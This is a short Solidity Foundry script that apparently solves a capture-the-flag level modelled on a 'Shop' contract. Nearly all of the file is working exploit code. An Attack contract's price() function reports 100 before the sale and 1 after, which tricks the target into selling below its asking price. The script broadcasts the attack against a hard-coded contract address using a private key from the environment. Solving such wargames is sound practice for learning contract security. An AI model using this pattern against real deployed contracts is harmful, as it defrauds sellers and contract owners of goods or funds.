// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "../src/Shop.sol";
import {Script, console} from "forge-std/Script.sol";

contract ShopSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        attack.buyCheaper();
        vm.stopBroadcast();
    }
}

contract Attack {
    Shop shop = Shop(0x28DE7aC3E074D5db02BeAdDf250D75ab42EaDD30);

    function buyCheaper() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold() == false) {
            return 100;
        }
        return 1;
    }
}
